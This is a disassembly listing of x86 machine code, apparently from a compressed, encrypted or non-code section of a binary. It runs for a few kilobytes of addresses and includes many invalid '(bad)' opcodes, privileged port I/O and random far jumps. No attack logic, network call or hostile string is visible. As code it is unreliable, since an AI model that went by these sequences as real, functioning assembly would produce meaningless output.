  41768f:	add    ch,BYTE PTR [edi+0x69]
  417692:	(bad)  
  417694:	inc    edi
  417695:	ret    0x6516
  417698:	jp     0x4176a8
  41769a:	add    ebp,DWORD PTR [esi-0x7b]
  41769d:	or     bl,BYTE PTR [esi+0x44df9c4f]
  4176a3:	or     DWORD PTR [esi+0x2f],0xffffffcc
  4176a7:	lahf   
  4176a8:	loopne 0x417649
  4176aa:	xchg   ecx,eax
  4176ab:	mov    eax,ds:0xb544b81a
  4176b0:	cli    
  4176b1:	fldcw  WORD PTR [edx-0x2e867970]
  4176b7:	lods   al,BYTE PTR ds:[esi]
  4176b8:	test   al,0xf2
  4176ba:	push   edx
  4176bb:	xor    al,0xc7
  4176bd:	(bad)  
  4176be:	shl    DWORD PTR [edx],1
  4176c0:	outs   dx,BYTE PTR ds:[esi]
  4176c1:	adc    ebp,DWORD PTR [ebx+0x3b]
  4176c4:	stos   DWORD PTR es:[edi],eax
  4176c5:	in     al,dx
  4176c6:	xor    esp,edx
  4176c8:	push   cs
  4176c9:	sbb    eax,0xf647eec2
  4176ce:	or     al,0xec
  4176d0:	outs   dx,BYTE PTR ds:[esi]
  4176d1:	pop    ss
  4176d2:	and    esi,0x4d
  4176d5:	popa   
  4176d6:	pop    eax
  4176d7:	aas    
  4176d8:	cmp    eax,0xdf1fbe6c
  4176dd:	out    0xa6,al
  4176df:	test   DWORD PTR [edx],eax
  4176e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e2:	add    BYTE PTR [ebp+0x4ec3aaff],dl
  4176e8:	(bad)  
  4176e9:	xchg   ebp,eax
  4176ea:	dec    ecx
  4176eb:	fisttp DWORD PTR [ecx+0x6b1f060f]
  4176f1:	test   BYTE PTR [eax-0x55],0x1e
  4176f5:	int    0x7a
  4176f7:	xchg   dh,dl
  4176f9:	ins    DWORD PTR es:[edi],dx
  4176fa:	xlat   BYTE PTR ds:[ebx]
  4176fb:	sub    eax,eax
  4176fd:	dec    edi
  4176fe:	pop    es
  4176ff:	inc    edx
  417700:	pop    esp
  417701:	jmp    0x4543:0x51ad4fbe
  417708:	mov    ah,BYTE PTR [edi-0x5d]
  41770b:	mov    bh,0x1b
  41770d:	clc    
  41770e:	push   ebp
  41770f:	cwde   
  417710:	loop   0x417764
  417712:	call   0x2c8a41ed
  417717:	mov    edi,0x88b412b4
  41771c:	fstp   DWORD PTR [ebp+0x29]
  41771f:	mov    cl,0x67
  417721:	ss nop
  417723:	mov    bl,0x6e
  417725:	xor    eax,DWORD PTR [edi-0x9a6f2b4]
  41772b:	sysexit 
  41772d:	sbb    BYTE PTR [edx-0x6185dee1],0xd5
  417734:	pushf  
  417735:	and    BYTE PTR [eax-0x297964c6],dh
  41773b:	retf   0xad51
  41773e:	outs   dx,BYTE PTR ds:[esi]
  41773f:	out    dx,al
  417740:	xor    edi,DWORD PTR ds:[edi-0x6a]
  417744:	shl    DWORD PTR [edx+ebx*1+0x66358a44],cl
  41774b:	dec    ebx
  41774c:	fidivr DWORD PTR [esi+eiz*2]
  41774f:	nop
  417750:	jecxz  0x41777d
  417752:	lea    ecx,[esi+0x37]
  417755:	push   0xffffffb6
  417757:	ficomp DWORD PTR [edx-0xd30c6af]
  41775d:	stc    
  41775e:	dec    edi
  41775f:	inc    edx
  417760:	nop
  417761:	rol    DWORD PTR ds:0x6a1efb9a,0x3
  417768:	inc    ebx
  417769:	push   ebx
  41776a:	sbb    ch,0x4f
  41776d:	repnz pushf 
  41776f:	add    ebx,esi
  417771:	lds    edi,FWORD PTR [edi]
  417773:	add    eax,0x9f9a08b6
  417778:	cdq    
  417779:	fbld   TBYTE PTR ds:0xc266d32c
  41777f:	jns    0x41775f
  417781:	mov    ecx,0x5f925d05
  417786:	out    dx,al
  417787:	xor    al,0x75
  417789:	xor    eax,0x71c4a652
  41778e:	add    DWORD PTR ds:0xd2fa6a19,edx
  417794:	push   ebp
  417795:	sti    
  417796:	out    dx,eax
  417797:	leave  
  417798:	loop   0x417815
  41779a:	inc    ebp
  41779b:	arpl   ax,cx
  41779d:	add    bl,dh
  41779f:	and    cl,0x69
  4177a2:	loope  0x41776e
  4177a4:	xchg   esi,eax
  4177a5:	cli    
  4177a6:	fstp   QWORD PTR [esi+0x24]
  4177a9:	ins    DWORD PTR es:[edi],dx
  4177aa:	jmp    0x2369:0x6347297d
  4177b1:	mov    ebp,0x649606dc
  4177b6:	sbb    eax,0xec7a7bc5
  4177bb:	stc    
  4177bc:	int    0x43
  4177be:	loop   0x4177ec
  4177c0:	es retf 0xa081
  4177c4:	dec    edi
  4177c5:	jg     0x417842
  4177c7:	jnp    0x4177ac
  4177c9:	mov    ebx,0xb4481d7b
  4177ce:	das    
  4177cf:	xlat   BYTE PTR ds:[ebx]
  4177d0:	cmp    DWORD PTR [edi],0xffffffe2
  4177d3:	ficom  WORD PTR [ebx+0x614b6908]
  4177d9:	jp     0x417849
  4177db:	xlat   BYTE PTR ds:[ebx]
  4177dc:	sti    
  4177dd:	mov    ds:0x1c8403cd,al
  4177e2:	test   BYTE PTR [eax],cl
  4177e4:	ins    BYTE PTR es:[edi],dx
  4177e5:	sti    
  4177e6:	mov    al,0xdf
  4177e8:	inc    esp
  4177e9:	or     al,0x1e
  4177eb:	mov    esp,0xf654fbfd
  4177f0:	ror    ebx,1
  4177f2:	mov    eax,0xf76f3eef
  4177f7:	pop    ecx
  4177f8:	dec    esp
  4177f9:	test   eax,0x964a67b7
  4177fe:	and    ah,BYTE PTR [ebx+0x62]
  417801:	ins    BYTE PTR es:[edi],dx
  417802:	bnd jl 0x41784b
  417805:	pop    edi
  417806:	cmc    
  417807:	jp     0x417821
  417809:	pushf  
  41780a:	sbb    eax,0xf6d0876a
  41780f:	sub    bh,ch
  417811:	dec    esp
  417812:	lock test eax,0x785a3d11
  417818:	loopne 0x417810
  41781a:	test   edx,ecx
  41781c:	mov    BYTE PTR [eax-0x4603f42a],ch
  417822:	jge    0x4177e5
  417824:	rep ins DWORD PTR es:[edi],dx
  417826:	inc    ebx
  417827:	inc    esi
  417828:	stos   DWORD PTR es:[edi],eax
  417829:	jae    0x4177ee
  41782b:	lods   al,BYTE PTR ds:[esi]
  41782c:	in     al,dx
  41782d:	outs   dx,DWORD PTR ds:[esi]
  41782e:	mov    BYTE PTR [edi+0x5e50a591],bl
  417834:	add    bh,bl
  417836:	stc    
  417837:	int    0xa9
  417839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783a:	adc    ah,dh
  41783c:	mov    ebx,DWORD PTR [esi+edx*8]
  41783f:	and    eax,0x62abd0e5
  417844:	xchg   esp,eax
  417845:	inc    ebp
  417846:	pop    ebx
  417847:	retf   
  417848:	test   BYTE PTR [ebx+0x5b],0x12
  41784c:	enter  0x2ff9,0x67
  417850:	(bad)  
  417851:	or     dl,BYTE PTR [ebx+0x777de837]
  417857:	aad    0xeb
  417859:	jmp    0x6de8e336
  41785e:	std    
  41785f:	lds    edx,FWORD PTR [esi]
  417861:	aad    0xaf
  417863:	int3   
  417864:	sub    edx,esi
  417866:	xchg   esp,eax
  417867:	jl     0x4177f9
  417869:	adc    BYTE PTR [esi+0x60],ah
  41786c:	push   0x5b
  41786e:	repnz and dh,al
  417871:	cwde   
  417872:	mov    bh,0x8c
  417874:	fist   DWORD PTR [ebx-0xc]
  417877:	hlt    
  417878:	ficomp WORD PTR [eax+0x4d]
  41787b:	sub    DWORD PTR [ebp+0x43a2bcee],esp
  417881:	fidivr DWORD PTR [edi]
  417883:	cmp    DWORD PTR [ebx-0x428b4f10],esi
  417889:	cmc    
  41788a:	(bad)  
  41788b:	enter  0xccca,0x93
  41788f:	scas   al,BYTE PTR es:[edi]
  417890:	adc    eax,0x27f8d455
  417895:	add    BYTE PTR [esi+0x73],al
  417898:	mov    es:0x784cf531,eax
  41789e:	mov    eax,ebp
  4178a0:	mov    ecx,0xf8302e4a
  4178a5:	jg     0x4178d8
  4178a7:	pop    eax
  4178a8:	stc    
  4178a9:	fldcw  WORD PTR [esi+0x780eac5c]
  4178af:	jns    0x4178fc
  4178b1:	imul   edx,DWORD PTR [ebp+0x5eca1ab7],0xffffffff
  4178b8:	or     ebp,0x70be00a0
  4178be:	xor    eax,0x5385b711
  4178c3:	pop    edx
  4178c4:	mov    ?,WORD PTR [eax]
  4178c6:	push   ecx
  4178c7:	out    0xee,al
  4178c9:	ret    
  4178ca:	mov    edx,0x7eadd21d
  4178cf:	repz jmp 0x4178c5
  4178d2:	dec    edi
  4178d3:	div    BYTE PTR [edx+0x1a]
  4178d6:	sbb    DWORD PTR [ebp-0x2a10f230],0x2c1fb03f
  4178e0:	aad    0x3f
  4178e2:	add    edx,esp
  4178e4:	or     BYTE PTR [esi+0x70dea9b5],cl
  4178ea:	rol    BYTE PTR [eax+ebx*2+0x7141fe00],cl
  4178f1:	inc    ebx
  4178f2:	cmc    
  4178f3:	int    0xaf
  4178f5:	xor    eax,0xe115a0ac
  4178fa:	fstp   QWORD PTR [edx]
  4178fc:	jmp    0x4178ce
  4178fe:	jns    0x41788e
  417900:	dec    esi
  417901:	push   ss
  417902:	repnz (bad) 
  417904:	push   ebp
  417905:	les    ebp,FWORD PTR [ebx+ecx*8]
  417908:	or     al,0x61
  41790a:	test   eax,0x233e40c6
  41790f:	push   edi
  417910:	in     eax,dx
  417911:	mov    al,0x6e
  417913:	inc    eax
  417914:	sub    dl,BYTE PTR [esi+0x58a85e55]
  41791a:	arpl   WORD PTR [esi*8+0x3154172b],bp
  417921:	aas    
  417922:	jo     0x417978
  417924:	sti    
  417925:	ins    DWORD PTR es:[edi],dx
  417926:	or     eax,0x6b6dbf6
  41792b:	sub    ah,ch
  41792d:	call   0x77af98b6
  417932:	repnz cmp al,0x69
  417935:	fsubr  DWORD PTR [esi]
  417937:	sbb    edi,DWORD PTR [ecx+eiz*4+0x47d9b620]
  41793e:	or     eax,0x2c5b7521
  417943:	(bad)  
  417944:	repnz pop edx
  417946:	mov    ds:0x851f5039,eax
  41794b:	out    0x6,al
  41794d:	add    esp,DWORD PTR [esi-0xc0645a]
  417953:	cmc    
  417954:	cmc    
  417955:	push   0xd0d23b88
  41795a:	mov    WORD PTR cs:[ecx-0x5f],ds
  41795e:	mov    eax,0xa337dbd
  417963:	cmp    eax,0x72a6cb90
  417968:	cmp    DWORD PTR [edi],ebx
  41796a:	arpl   WORD PTR [esi],ax
  41796c:	shr    bh,0xac
  41796f:	fadd   DWORD PTR [ebx+0x6cc26c6c]
  417975:	xor    DWORD PTR [edi+ebp*4],edx
  417978:	xor    dl,al
  41797a:	and    DWORD PTR [edi],0xffffff8f
  41797d:	dec    ecx
  41797e:	adc    DWORD PTR [ecx+0x5c],edx
  417981:	sub    edi,esp
  417983:	add    dh,0x73
  417986:	mov    ebx,0xccb219fa
  41798b:	pop    esp
  41798c:	push   es
  41798d:	and    dl,BYTE PTR [esi-0x6b]
  417990:	or     edi,DWORD PTR [esp+edi*1+0x64]
  417994:	sahf   
  417995:	sub    eax,0x1a5687c6
  41799a:	(bad)  
  41799b:	ror    ah,1
  41799d:	rcl    BYTE PTR [edi],cl
  41799f:	xchg   BYTE PTR [esi+0x7dbb99d4],dh
  4179a5:	cmp    ecx,DWORD PTR [esi]
  4179a7:	out    dx,eax
  4179a8:	popa   
  4179a9:	imul   edx,DWORD PTR [edi-0x32],0x8edfe073
  4179b0:	xchg   ebx,eax
  4179b1:	sub    al,0xfd
  4179b3:	push   edx
  4179b4:	sbb    DWORD PTR [ecx+edi*4+0x50d44755],ebx
  4179bb:	push   ss
  4179bc:	aam    0xf4
  4179be:	enter  0xdf13,0x89
  4179c2:	test   bh,ah
  4179c4:	into   
  4179c5:	in     eax,0x96
  4179c7:	pop    es
  4179c8:	xchg   ebx,eax
  4179c9:	adc    BYTE PTR [esi],bl
  4179cb:	ss leave 
  4179cd:	in     al,0x19
  4179cf:	ret    0xf2c3
  4179d2:	int    0x25
  4179d4:	adc    edi,0x4f
  4179d7:	ret    0x8cea
  4179da:	sbb    eax,0x1bab7ae2
  4179df:	fmul   DWORD PTR [edx+0x1ca37001]
  4179e5:	sub    edx,DWORD PTR [ecx+0x18]
  4179e8:	jp     0x4179a9
  4179ea:	push   cs
  4179eb:	lds    ecx,FWORD PTR [edx-0x17bb32de]
  4179f1:	addr16 xchg ebx,eax
  4179f3:	sbb    edx,ebx
  4179f5:	in     eax,0x8a
  4179f7:	push   cs
  4179f8:	sub    BYTE PTR [esi-0x29],dl
  4179fb:	popf   
  4179fc:	pop    ecx
  4179fd:	mov    al,ds:0x167a02f5
  417a02:	dec    ecx
  417a03:	sub    esi,DWORD PTR [edx+0xc]
  417a06:	pop    eax
  417a07:	and    dl,BYTE PTR [edx+0x7c]
  417a0a:	stc    
  417a0b:	mov    bh,0x62
  417a0d:	sbb    DWORD PTR [esi-0x1a],edi
  417a10:	dec    edi
  417a11:	popa   
  417a12:	loop   0x417a5d
  417a14:	js     0x417a35
  417a16:	cli    
  417a17:	iret   
  417a18:	push   ebp
  417a19:	cmc    
  417a1a:	outs   dx,BYTE PTR ds:[esi]
  417a1b:	out    0x1a,eax
  417a1d:	lahf   
  417a1e:	xor    eax,0x29e8929e
  417a23:	enter  0x6fa,0x2
  417a27:	sete   BYTE PTR [ebp-0x44ebca1d]
  417a2e:	out    dx,al
  417a2f:	xor    BYTE PTR [esi+edx*1-0x5d],dl
  417a33:	mov    bh,0x72
  417a35:	and    ch,cl
  417a37:	call   0x2e4f3f8e
  417a3c:	adc    ecx,DWORD PTR [edx-0x76]
  417a3f:	loope  0x4179f5
  417a41:	pop    eax
  417a42:	push   es
  417a43:	push   esp
  417a44:	retf   0x5b25
  417a47:	dec    ecx
  417a48:	int3   
  417a49:	in     eax,dx
  417a4a:	fsub   st,st(6)
  417a4c:	push   ds
  417a4d:	jns    0x417aa0
  417a4f:	add    bh,BYTE PTR [eax]
  417a51:	dec    esi
  417a52:	fnstcw WORD PTR [ebx+edi*2+0x220f0582]
  417a59:	in     al,0x8a
  417a5b:	pop    esi
  417a5c:	mov    eax,ds:0x7d516f94
  417a61:	in     eax,dx
  417a62:	push   es
  417a63:	sub    esi,DWORD PTR [edi]
  417a65:	out    0x3b,al
  417a67:	adc    eax,0x291a4a0
  417a6c:	das    
  417a6d:	in     eax,0x2a
  417a6f:	xchg   BYTE PTR [eax-0x47],ch
  417a72:	cld    
  417a73:	jle    0x417aac
  417a75:	sar    BYTE PTR [ebp+0x17ceebde],cl
  417a7b:	and    al,0x8b
  417a7d:	aad    0xe0
  417a7f:	fistp  QWORD PTR [edi+0x7a7d1f10]
  417a85:	sub    ebp,DWORD PTR [edx-0x39]
  417a88:	xchg   ecx,eax
  417a89:	arpl   WORD PTR [edi-0x60],dx
  417a8c:	sbb    esp,DWORD PTR [esi-0x1d6bd8b8]
  417a92:	test   eax,0xeb4b23d9
  417a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a99:	aad    0xa9
  417a9b:	adc    DWORD PTR [edi-0x5a],ebp
  417a9e:	je     0x417a65
  417aa0:	xor    BYTE PTR es:[edi+0xe3e2cba],dh
  417aa7:	push   ebp
  417aa8:	mov    cl,0x78
  417aaa:	mov    al,ds:0xe9380550
  417aaf:	scas   al,BYTE PTR es:[edi]
  417ab0:	mov    dl,al
  417ab2:	mov    ch,0x56
  417ab4:	cdq    
  417ab5:	jns    0x417b04
  417ab7:	xrelease xchg DWORD PTR [ebp+0x44],esi
  417abb:	out    dx,eax
  417abc:	call   0x51afe50
  417ac1:	jbe    0x417a6d
  417ac3:	(bad)  
  417ac5:	pop    edx
  417ac6:	mov    eax,0xf802d220
  417acb:	adc    dl,BYTE PTR [edx]
  417acd:	(bad)  
  417ace:	iret   
  417acf:	mov    esi,0xfef06e1e
  417ad4:	in     al,dx
  417ad5:	inc    edx
  417ad6:	clc    
  417ad7:	xor    eax,0xa70f32e3
  417adc:	adc    cl,BYTE PTR [esi+eiz*8]
  417adf:	idiv   DWORD PTR [ebx+edx*4]
  417ae2:	mov    ebp,0xb4205d85
  417ae7:	or     al,0x14
  417ae9:	sub    ebp,DWORD PTR [esi+0x11]
  417aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aed:	mov    ch,0x1
  417aef:	leave  
  417af0:	sbb    al,dl
  417af2:	ret    
  417af3:	loopne 0x417a88
  417af5:	ins    BYTE PTR es:[edi],dx
  417af6:	adc    bh,BYTE PTR [esi+0x48b37906]
  417afc:	ror    DWORD PTR ds:0x99a13c00,cl
  417b02:	stos   BYTE PTR es:[edi],al
  417b03:	lods   al,BYTE PTR ds:[esi]
  417b04:	aam    0xa9
  417b06:	in     eax,dx
  417b07:	clc    
  417b08:	jbe    0x417ade
  417b0a:	inc    edi
  417b0b:	sbb    al,0x55
  417b0d:	int3   
  417b0e:	mov    edi,0x24ece1bf
  417b13:	xor    edx,DWORD PTR ds:0x3aec9cf
  417b19:	aam    0x75
  417b1b:	cs in  eax,dx
  417b1d:	pop    ds
  417b1e:	pop    es
  417b1f:	pop    esi
  417b20:	adc    edx,esi
  417b22:	cmp    eax,0xbc745a0a
  417b27:	aad    0xbf
  417b29:	cmp    edi,DWORD PTR [eax-0x72582ef5]
  417b2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b30:	mov    WORD PTR [eax+0x2f9e99de],?
  417b36:	xchg   edx,eax
  417b37:	mov    al,0xf2
  417b39:	xchg   al,ah
  417b3b:	mov    ah,0x34
  417b3d:	lds    eax,FWORD PTR [eax]
  417b3f:	xor    eax,0xd63761a3
  417b44:	adc    cl,BYTE PTR [esi-0x7027c71f]
  417b4a:	jmp    0x417b70
  417b4c:	push   bp
  417b4e:	or     DWORD PTR [esi+ebx*1-0x78c9ae72],ebp
  417b55:	xchg   ebp,eax
  417b56:	xchg   ebp,eax
  417b57:	jg     0x417b58
  417b59:	or     DWORD PTR [edx],esi
  417b5b:	cwde   
  417b5c:	xchg   esp,eax
  417b5d:	in     al,dx
  417b5e:	xchg   esp,eax
  417b5f:	jo     0x417b58
  417b61:	test   al,bh
  417b63:	popa   
  417b64:	push   0x9a017e91
  417b69:	jmp    0x417ba2
  417b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b6c:	add    esi,esi
  417b6e:	add    BYTE PTR [esi-0x32bfa855],ah
  417b74:	mov    eax,0x68ff21d7
  417b79:	call   0x596b9b23
  417b7e:	shr    BYTE PTR [eax+0x1f],cl
  417b81:	sti    
  417b82:	jb     0x417bdb
  417b84:	jne    0x417b40
  417b86:	and    esi,ebx
  417b88:	jno    0x417b2a
  417b8a:	sbb    cl,BYTE PTR [eax+0x50]
  417b8d:	fwait
  417b8e:	push   es
  417b8f:	test   DWORD PTR [eax+ecx*1],eax
  417b92:	fld    TBYTE PTR [ebx+0x73]
  417b95:	into   
  417b96:	mov    al,ds:0xa18b0e40
  417b9b:	aam    0x1b
  417b9d:	push   ds
  417b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9f:	and    BYTE PTR [eax+0x25cc563a],bl
  417ba5:	push   esp
  417ba6:	lods   al,BYTE PTR ds:[esi]
  417ba7:	and    eax,0x320ac28
  417bac:	stos   BYTE PTR es:[edi],al
  417bad:	ret    0x6675
  417bb0:	test   al,0x89
  417bb2:	stos   DWORD PTR es:[edi],eax
  417bb3:	shl    BYTE PTR [ebp+0x13dbca83],0xa3
  417bba:	xchg   BYTE PTR ss:[ecx+eax*2+0x12d776cb],ah
  417bc2:	stos   DWORD PTR es:[edi],eax
  417bc3:	mov    DWORD PTR [edi+0x46],edx
  417bc6:	int3   
  417bc7:	bnd jnp 0x417b61
  417bca:	mov    bl,0x32
  417bcc:	popf   
  417bcd:	add    ch,BYTE PTR ds:0x1c941cdb
  417bd3:	dec    edi
  417bd4:	pop    es
  417bd5:	dec    esp
  417bd6:	aad    0x10
  417bd8:	jle    0x417c10
  417bda:	jp     0x417b6d
  417bdc:	imul   eax,DWORD PTR [edi-0x50bd6af1],0x187b82e6
  417be6:	xchg   ecx,eax
  417be7:	jmp    0x99233513
  417bec:	inc    ebx
  417bed:	mov    BYTE PTR [eax+0x6a925339],0xff
  417bf4:	or     esp,ebp
  417bf6:	in     al,dx
  417bf7:	cmp    BYTE PTR ss:[ecx],al
  417bfa:	fld    DWORD PTR [edi-0x79c777e6]
  417c00:	xor    BYTE PTR [edx-0x2c4da9e0],ah
  417c06:	cmc    
  417c07:	sub    ah,BYTE PTR [ecx-0x7d079c95]
  417c0d:	cs xchg esi,eax
  417c0f:	mov    WORD PTR [esi],es
  417c11:	mov    al,0x51
  417c13:	scas   eax,DWORD PTR es:[edi]
  417c14:	bound  eax,QWORD PTR [esi]
  417c16:	lock outs dx,BYTE PTR ds:[esi]
  417c18:	dec    ebp
  417c19:	or     BYTE PTR [edx+0x3570b228],cl
  417c1f:	sbb    al,0x81
  417c21:	(bad)  
  417c22:	dec    ebp
  417c23:	cmp    eax,0x8af140be
  417c28:	push   es
  417c29:	popa   
  417c2a:	add    edx,DWORD PTR [edx]
  417c2c:	sub    DWORD PTR [edi-0x53],edi
  417c2f:	adc    dl,BYTE PTR [esi]
  417c31:	mov    esi,0x2293ba25
  417c36:	bound  ecx,QWORD PTR [esi]
  417c38:	add    dh,dl
  417c3a:	lea    eax,[esi-0x5b]
  417c3d:	push   edi
  417c3e:	jge    0x417c43
  417c40:	mov    cl,0xae
  417c42:	ror    al,cl
  417c44:	ja     0x417c21
  417c46:	pop    eax
  417c47:	mov    eax,0x824bbae0
  417c4c:	xchg   ebx,eax
  417c4d:	push   ecx
  417c4e:	lahf   
  417c4f:	and    eax,DWORD PTR [ecx-0x650ead86]
  417c55:	and    ebx,ecx
  417c57:	cli    
  417c58:	mov    dh,0xb8
  417c5a:	popf   
  417c5b:	test   BYTE PTR [edi+esi*1],dl
  417c5e:	pop    esi
  417c5f:	jbe    0x417c4b
  417c61:	cmp    BYTE PTR [eax+edx*2],ah
  417c64:	leave  
  417c65:	test   eax,0x8357cab8
  417c6a:	add    al,0x3d
  417c6c:	sti    
  417c6d:	fisubr DWORD PTR [ecx+esi*2]
  417c70:	sbb    bh,al
  417c72:	gs mov ebp,0xeef77d37
  417c78:	into   
  417c79:	cmp    DWORD PTR [ecx],0x6ef71362
  417c7f:	or     eax,0x4603780f
  417c84:	into   
  417c85:	sar    DWORD PTR [edx-0xb7b51e1],cl
  417c8b:	mov    al,0x74
  417c8d:	(bad)  
  417c8e:	sub    dl,dh
  417c90:	add    ecx,esi
  417c92:	mov    ds:0x8736ac06,al
  417c97:	and    al,BYTE PTR [ecx]
  417c99:	lock loope 0x417c76
  417c9c:	jl     0x417d08
  417c9e:	sti    
  417c9f:	push   edx
  417ca0:	retf   0xc45b
  417ca3:	or     cl,BYTE PTR [eax-0x706335e6]
  417ca9:	(bad)  
  417caa:	cld    
  417cab:	in     al,0x50
  417cad:	enter  0x2ecd,0x5a
  417cb1:	in     al,0xf2
  417cb3:	add    edi,edi
  417cb5:	dec    edi
  417cb6:	(bad)  [esi-0x5a]
  417cb9:	(bad)  
  417cba:	adc    BYTE PTR [edx+0x24ef9716],bl
  417cc0:	or     BYTE PTR [ebx-0x3bc6aadf],ch
  417cc6:	mov    esp,0x4143ef04
  417ccb:	jae    0x417cca
  417ccd:	into   
  417cce:	dec    ebx
  417ccf:	sub    BYTE PTR [ebp+0x64e1f6ad],al
  417cd5:	loopne 0x417d38
  417cd7:	add    eax,0x6144513c
  417cdc:	imul   esi,DWORD PTR [eax+0x7592ab78],0x7396254b
  417ce6:	dec    ebp
  417ce7:	js     0x417c6a
  417ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cea:	stc    
  417ceb:	pop    esp
  417cec:	jmp    0xa04b6a19
  417cf1:	fdivrp st(5),st
  417cf3:	mov    esi,0x47cb22a7
  417cf8:	sub    al,dl
  417cfa:	sub    ah,BYTE PTR [ebx-0x5c201b06]
  417d00:	add    esi,esp
  417d02:	jb     0x417cc1
  417d04:	enter  0xffb9,0xce
  417d08:	inc    ebx
  417d09:	icebp  
  417d0a:	pop    es
  417d0b:	xor    DWORD PTR [edi],ebp
  417d0d:	mov    bh,0xb9
  417d0f:	mov    bh,0x33
  417d11:	test   DWORD PTR [ebx+0x60],esi
  417d14:	jmp    0x9a40:0xec382c70
  417d1b:	je     0x417d1e
  417d1d:	push   eax
  417d1e:	ret    0xf183
  417d21:	setbe  BYTE PTR ds:0xa8e0a448
  417d28:	gs pusha 
  417d2a:	retf   
  417d2b:	jmp    0x417d84
  417d2d:	sbb    DWORD PTR [edx],ebx
  417d2f:	inc    eax
  417d30:	jns    0x417cf5
  417d32:	sbb    BYTE PTR [esi+eax*2-0x676f7128],0x49
  417d3a:	mov    esi,DWORD PTR [eax]
  417d3c:	add    DWORD PTR [edi-0x528ffa97],edi
  417d42:	jecxz  0x417d8b
  417d44:	jo     0x417d64
  417d46:	adc    BYTE PTR [ecx],bh
  417d48:	popa   
  417d49:	not    DWORD PTR [edx-0xc]
  417d4c:	sbb    cl,BYTE PTR [ecx]
  417d4e:	into   
  417d4f:	ds or  al,0xce
  417d52:	call   FWORD PTR ds:0x6b6f3736
  417d58:	lss    edx,FWORD PTR [ebp-0x15]
  417d5c:	jb     0x417dba
  417d5e:	push   0x583f40a5
  417d63:	xchg   esi,eax
  417d64:	mov    ch,0x56
  417d66:	fmul   DWORD PTR [ecx-0x79]
  417d69:	inc    edi
  417d6a:	mov    ecx,0x159aa80
  417d6f:	test   BYTE PTR [eax],bl
  417d71:	jo     0x17d1b95
  417d77:	and    DWORD PTR [ecx-0x481ab73f],edi
  417d7d:	nop
  417d7e:	xchg   DWORD PTR [edx+0x5605b189],eax
  417d84:	cs sahf 
  417d86:	les    esi,FWORD PTR [esi+0x51]
  417d89:	call   0xce10:0x704f7354
  417d90:	jo     0x417d74
  417d92:	add    edi,esp
  417d94:	push   ecx
  417d95:	mov    eax,ds:0xc0beb6c1
  417d9a:	jge    0x417e18
  417d9c:	mov    edi,0xa0904a62
  417da1:	and    BYTE PTR [ebp+0x500e0586],0xd5
  417da8:	ss ja  0x417dd0
  417dab:	add    BYTE PTR [ebx],dl
  417dad:	inc    edx
  417dae:	ret    0xefe8
  417db1:	xor    DWORD PTR ds:0xa12ff7fe,ebx
  417db7:	sub    BYTE PTR [esi-0x48d3a68e],dh
  417dbd:	inc    eax
  417dbe:	or     eax,0x76663125
  417dc3:	cmp    eax,0xba683bba
  417dc8:	sub    eax,0xf29785f7
  417dcd:	repnz mov ch,0xa0
  417dd0:	dec    ebp
  417dd1:	fisub  DWORD PTR [ebx-0x6e]
  417dd4:	xor    eax,0x693cfac6
  417dd9:	pop    edx
  417dda:	xchg   esi,eax
  417ddb:	cli    
  417ddc:	ins    BYTE PTR es:[edi],dx
  417ddd:	push   0x29bb3251
  417de2:	outs   dx,DWORD PTR ds:[esi]
  417de3:	das    
  417de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417de5:	mov    eax,0xfb7c734c
  417dea:	push   ds
  417deb:	mov    ds:0x9e341674,al
  417df0:	sub    eax,0xe860f7e9
  417df5:	sahf   
  417df6:	xchg   esi,eax
  417df7:	pop    edx
  417df8:	jno    0x417e63
  417dfa:	scas   al,BYTE PTR es:[edi]
  417dfb:	inc    edx
  417dfc:	test   al,0x5b
  417dfe:	xor    eax,ebp
  417e00:	sti    
  417e01:	rcr    DWORD PTR [ebp+esi*4-0x10],0xc6
  417e06:	pop    eax
  417e07:	bound  edx,QWORD PTR [eax+0x39cb7ace]
  417e0d:	mov    dh,0xfd
  417e0f:	or     eax,0x7c6f1984
  417e14:	outs   dx,BYTE PTR ds:[esi]
  417e15:	and    ecx,DWORD PTR [edx+0x3c0b925c]
  417e1b:	adc    ch,dh
  417e1d:	int    0x43
  417e1f:	push   esi
  417e20:	dec    eax
  417e21:	aaa    
  417e22:	js     0x417dfe
  417e24:	dec    esp
  417e25:	outs   dx,BYTE PTR ds:[esi]
  417e26:	cmp    al,0x14
  417e28:	mov    ebp,0x42b28f1
  417e2d:	mov    al,0x1d
  417e2f:	ret    
  417e30:	fld    QWORD PTR [ecx-0x4f]
  417e33:	ficomp WORD PTR [esi+0x14]
  417e36:	lahf   
  417e37:	in     al,dx
  417e38:	or     bl,dl
  417e3a:	fs repnz xchg ecx,eax
  417e3d:	xchg   esp,eax
  417e3e:	loopne 0x417e76
  417e40:	jp     0x417de6
  417e42:	sbb    eax,eax
  417e44:	in     al,dx
  417e45:	sbb    eax,0xa87f6dac
  417e4a:	mov    dh,0x59
  417e4c:	jo     0x417e92
  417e4e:	adc    ebp,DWORD PTR [edx-0x7cee5d67]
  417e54:	fwait
  417e55:	add    cl,ch
  417e57:	enter  0xd926,0x56
  417e5b:	fs pop es
  417e5d:	ins    BYTE PTR es:[edi],dx
  417e5e:	dec    ebx
  417e5f:	in     al,dx
  417e60:	ret    
  417e61:	cld    
  417e62:	xchg   esp,eax
  417e63:	repnz std 
  417e65:	retf   
  417e66:	sbb    DWORD PTR [ebx],ebx
  417e68:	retf   
  417e69:	add    al,0x10
  417e6b:	das    
  417e6c:	call   0x3552:0x5972cab0
  417e73:	data16 and al,BYTE PTR [ebp*1-0x390d680b]
  417e7b:	jo     0x417e19
  417e7d:	sbb    edx,DWORD PTR [ecx]
  417e7f:	pop    es
  417e80:	repz xor DWORD PTR [ebx],ebx
  417e83:	inc    edi
  417e84:	repnz ins BYTE PTR es:[edi],dx
  417e86:	js     0x417e36
  417e88:	outs   dx,BYTE PTR ds:[esi]
  417e89:	inc    esp
  417e8a:	sti    
  417e8b:	lahf   
  417e8c:	adc    ah,BYTE PTR [ecx+ebp*8+0x8]
